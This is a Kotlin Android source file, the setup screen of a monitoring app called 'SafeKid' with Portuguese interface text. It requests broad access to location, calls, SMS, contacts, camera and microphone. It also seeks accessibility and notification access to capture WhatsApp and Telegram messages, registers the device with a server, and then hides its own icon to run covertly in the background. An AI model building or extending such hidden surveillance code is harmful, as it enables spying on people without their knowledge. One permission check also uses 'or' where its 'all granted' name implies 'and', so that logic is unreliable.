package com.safekid.monitor

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.lifecycle.lifecycleScope
import com.safekid.monitor.data.api.ApiService
import com.safekid.monitor.data.preferences.AppPreferences
import com.safekid.monitor.databinding.ActivitySetupBinding
import com.safekid.monitor.services.MonitoringService
import com.safekid.monitor.utils.DeviceUtils
import com.safekid.monitor.utils.PermissionUtils
import kotlinx.coroutines.launch
import org.koin.android.ext.android.inject
import timber.log.Timber

class SetupActivity : AppCompatActivity() {

    private lateinit var binding: ActivitySetupBinding
    private val preferences: AppPreferences by inject()
    private val apiService: ApiService by inject()

    private var currentStep = 0
    private val totalSteps = 4

    // Permissões necessárias
    private val requiredPermissions = arrayOf(
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_SMS,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.READ_EXTERNAL_STORAGE,
        Manifest.permission.CAMERA,
        Manifest.permission.RECORD_AUDIO
    )

    // Launcher para permissões
    private val permissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { permissions ->
        handlePermissionsResult(permissions)
    }

    // Launcher para configurações
    private val settingsLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) {
        checkSpecialPermissions()
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        // Verificar se já está configurado
        if (preferences.isAppConfigured()) {
            finishSetup()
            return
        }

        binding = ActivitySetupBinding.inflate(layoutInflater)
        setContentView(binding.root)

        setupUI()
        startSetupProcess()
    }

    private fun setupUI() {
        binding.apply {
            buttonNext.setOnClickListener { nextStep() }
            buttonSkip.setOnClickListener { skipStep() }
            buttonFinish.setOnClickListener { finishSetup() }
            
            // Configurar progress
            progressBar.max = totalSteps
            progressBar.progress = currentStep
        }
    }

    private fun startSetupProcess() {
        showStep(0)
    }

    private fun showStep(step: Int) {
        currentStep = step
        binding.progressBar.progress = currentStep

        when (step) {
            0 -> showWelcomeStep()
            1 -> showPermissionsStep()
            2 -> showSpecialPermissionsStep()
            3 -> showConfigurationStep()
            else -> finishSetup()
        }
    }

    private fun showWelcomeStep() {
        binding.apply {
            stepTitle.text = "Bem-vindo ao SafeKid"
            stepDescription.text = """
                Este aplicativo irá monitorar o dispositivo para garantir a segurança.
                
                • Localização em tempo real
                • Monitoramento de chamadas e mensagens
                • Captura de fotos e vídeos
                • Controle de aplicativos
                
                Toque em "Próximo" para continuar.
            """.trimIndent()
            
            buttonNext.text = "Próximo"
            buttonNext.isEnabled = true
            buttonSkip.text = "Sair"
        }
    }

    private fun showPermissionsStep() {
        binding.apply {
            stepTitle.text = "Permissões Necessárias"
            stepDescription.text = """
                Para funcionar corretamente, o aplicativo precisa das seguintes permissões:
                
                • Localização (GPS)
                • Telefone e chamadas
                • SMS e contatos
                • Câmera e microfone
                • Armazenamento
                
                Toque em "Conceder" para solicitar as permissões.
            """.trimIndent()
            
            buttonNext.text = "Conceder Permissões"
            buttonNext.isEnabled = true
            buttonSkip.text = "Pular"
        }
    }

    private fun showSpecialPermissionsStep() {
        binding.apply {
            stepTitle.text = "Configurações Especiais"
            stepDescription.text = """
                Para monitoramento completo, são necessárias algumas configurações especiais:
                
                • Acessibilidade (para WhatsApp/Telegram)
                • Notificações (para capturar mensagens)
                • Otimização de bateria (para funcionar em background)
                • Administrador do dispositivo
                
                Toque em "Configurar" para abrir as configurações.
            """.trimIndent()
            
            buttonNext.text = "Configurar"
            buttonNext.isEnabled = true
            buttonSkip.text = "Pular"
        }
    }

    private fun showConfigurationStep() {
        binding.apply {
            stepTitle.text = "Configuração Final"
            stepDescription.text = """
                Conectando com o servidor SafeKid...
                
                • Registrando dispositivo
                • Gerando chaves de segurança
                • Testando conectividade
                
                Aguarde enquanto finalizamos a configuração.
            """.trimIndent()
            
            buttonNext.text = "Configurando..."
            buttonNext.isEnabled = false
            buttonSkip.text = "Cancelar"
        }

        // Iniciar configuração automática
        performFinalConfiguration()
    }

    private fun nextStep() {
        when (currentStep) {
            0 -> showStep(1)
            1 -> requestPermissions()
            2 -> requestSpecialPermissions()
            3 -> performFinalConfiguration()
        }
    }

    private fun skipStep() {
        when (currentStep) {
            0 -> finish() // Sair do app
            1 -> showStep(2) // Pular permissões básicas
            2 -> showStep(3) // Pular permissões especiais
            3 -> finish() // Cancelar configuração
        }
    }

    private fun requestPermissions() {
        val missingPermissions = requiredPermissions.filter {
            ActivityCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }

        if (missingPermissions.isEmpty()) {
            showStep(2)
            return
        }

        // Solicitar permissões faltantes
        permissionLauncher.launch(missingPermissions.toTypedArray())
    }

    private fun handlePermissionsResult(permissions: Map<String, Boolean>) {
        val deniedPermissions = permissions.filter { !it.value }.keys

        if (deniedPermissions.isEmpty()) {
            Toast.makeText(this, "Permissões concedidas!", Toast.LENGTH_SHORT).show()
            showStep(2)
        } else {
            // Mostrar diálogo explicativo para permissões negadas
            showPermissionExplanationDialog(deniedPermissions.toList())
        }
    }

    private fun showPermissionExplanationDialog(deniedPermissions: List<String>) {
        AlertDialog.Builder(this)
            .setTitle("Permissões Necessárias")
            .setMessage(
                "As seguintes permissões são essenciais para o funcionamento:\n\n" +
                deniedPermissions.joinToString("\n") { getPermissionDescription(it) } +
                "\n\nDeseja tentar novamente?"
            )
            .setPositiveButton("Tentar Novamente") { _, _ ->
                requestPermissions()
            }
            .setNegativeButton("Continuar Mesmo Assim") { _, _ ->
                showStep(2)
            }
            .setNeutralButton("Abrir Configurações") { _, _ ->
                openAppSettings()
            }
            .show()
    }

    private fun getPermissionDescription(permission: String): String {
        return when (permission) {
            Manifest.permission.ACCESS_FINE_LOCATION -> "• Localização precisa"
            Manifest.permission.ACCESS_COARSE_LOCATION -> "• Localização aproximada"
            Manifest.permission.READ_PHONE_STATE -> "• Estado do telefone"
            Manifest.permission.READ_CALL_LOG -> "• Histórico de chamadas"
            Manifest.permission.READ_SMS -> "• Leitura de SMS"
            Manifest.permission.READ_CONTACTS -> "• Leitura de contatos"
            Manifest.permission.READ_EXTERNAL_STORAGE -> "• Armazenamento"
            Manifest.permission.CAMERA -> "• Câmera"
            Manifest.permission.RECORD_AUDIO -> "• Microfone"
            else -> "• $permission"
        }
    }

    private fun requestSpecialPermissions() {
        val pendingPermissions = mutableListOf<String>()

        // Verificar acessibilidade
        if (!PermissionUtils.isAccessibilityServiceEnabled(this)) {
            pendingPermissions.add("Serviço de Acessibilidade")
        }

        // Verificar notificações
        if (!PermissionUtils.isNotificationListenerEnabled(this)) {
            pendingPermissions.add("Acesso a Notificações")
        }

        // Verificar otimização de bateria
        if (!PermissionUtils.isBatteryOptimizationDisabled(this)) {
            pendingPermissions.add("Otimização de Bateria")
        }

        if (pendingPermissions.isEmpty()) {
            showStep(3)
            return
        }

        // Mostrar diálogo explicativo
        AlertDialog.Builder(this)
            .setTitle("Configurações Especiais")
            .setMessage(
                "Para monitoramento completo, configure:\n\n" +
                pendingPermissions.joinToString("\n") { "• $it" } +
                "\n\nVamos abrir as configurações necessárias."
            )
            .setPositiveButton("Configurar") { _, _ ->
                openSpecialPermissionSettings()
            }
            .setNegativeButton("Pular") { _, _ ->
                showStep(3)
            }
            .show()
    }

    private fun openSpecialPermissionSettings() {
        // Abrir configurações de acessibilidade
        if (!PermissionUtils.isAccessibilityServiceEnabled(this)) {
            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
            settingsLauncher.launch(intent)
            return
        }

        // Abrir configurações de notificações
        if (!PermissionUtils.isNotificationListenerEnabled(this)) {
            val intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
            settingsLauncher.launch(intent)
            return
        }

        // Abrir configurações de bateria
        if (!PermissionUtils.isBatteryOptimizationDisabled(this)) {
            val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
            intent.data = Uri.parse("package:$packageName")
            settingsLauncher.launch(intent)
            return
        }

        // Se chegou aqui, todas estão configuradas
        showStep(3)
    }

    private fun checkSpecialPermissions() {
        // Verificar se todas as permissões especiais foram concedidas
        val allGranted = PermissionUtils.isAccessibilityServiceEnabled(this) ||
                        PermissionUtils.isNotificationListenerEnabled(this) ||
                        PermissionUtils.isBatteryOptimizationDisabled(this)

        if (allGranted) {
            Toast.makeText(this, "Configurações aplicadas!", Toast.LENGTH_SHORT).show()
        }

        // Continuar mesmo se nem todas foram concedidas
        showStep(3)
    }

    private fun performFinalConfiguration() {
        lifecycleScope.launch {
            try {
                binding.stepDescription.text = "Registrando dispositivo..."

                // Registrar dispositivo no servidor
                val deviceInfo = DeviceUtils.getDeviceInfo(this@SetupActivity)
                val response = apiService.registerDevice(
                    deviceUuid = preferences.getDeviceUuid(),
                    deviceInfo = deviceInfo
                )

                if (!response.isSuccessful) {
                    throw Exception("Falha no registro: ${response.code()}")
                }

                binding.stepDescription.text = "Testando conectividade..."

                // Enviar heartbeat inicial
                val heartbeatResponse = apiService.sendHeartbeat(
                    deviceUuid = preferences.getDeviceUuid(),
                    data = mapOf(
                        "status" to "setup_complete",
                        "timestamp" to System.currentTimeMillis()
                    )
                )

                if (!heartbeatResponse.isSuccessful) {
                    throw Exception("Falha no teste de conectividade")
                }

                binding.stepDescription.text = "Configuração concluída!"

                // Marcar como configurado
                preferences.setAppConfigured(true)
                preferences.setMonitoringEnabled(true)

                // Aguardar um pouco para mostrar sucesso
                kotlinx.coroutines.delay(1000)

                // Finalizar configuração
                completeSetup()

            } catch (e: Exception) {
                Timber.e(e, "Erro na configuração final")
                showConfigurationError(e.message ?: "Erro desconhecido")
            }
        }
    }

    private fun showConfigurationError(error: String) {
        AlertDialog.Builder(this)
            .setTitle("Erro na Configuração")
            .setMessage("Ocorreu um erro durante a configuração:\n\n$error\n\nDeseja tentar novamente?")
            .setPositiveButton("Tentar Novamente") { _, _ ->
                performFinalConfiguration()
            }
            .setNegativeButton("Configurar Depois") { _, _ ->
                finish()
            }
            .show()
    }

    private fun completeSetup() {
        binding.apply {
            stepTitle.text = "Configuração Concluída!"
            stepDescription.text = """
                O SafeKid foi configurado com sucesso!
                
                • Dispositivo registrado
                • Monitoramento ativo
                • Conectividade testada
                
                O aplicativo irá funcionar em segundo plano.
            """.trimIndent()
            
            buttonNext.text = "Finalizar"
            buttonNext.isEnabled = true
            buttonSkip.text = "Cancelar"
        }
    }

    private fun finishSetup() {
        // Iniciar serviços de monitoramento
        MonitoringService.start(this)

        // Ocultar ícone do aplicativo
        (application as SafeKidApplication).hideAppIcon()

        // Mostrar mensagem de sucesso
        Toast.makeText(this, "SafeKid ativo em segundo plano", Toast.LENGTH_LONG).show()

        // Finalizar atividade
        finish()
    }

    private fun openAppSettings() {
        val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
        intent.data = Uri.parse("package:$packageName")
        startActivity(intent)
    }

    override fun onBackPressed() {
        if (currentStep == 0) {
            super.onBackPressed()
        } else {
            showStep(currentStep - 1)
        }
    }

    override fun onResume() {
        super.onResume()
        
        // Se voltou de configurações, verificar permissões especiais
        if (currentStep == 2) {
            checkSpecialPermissions()
        }
    }
}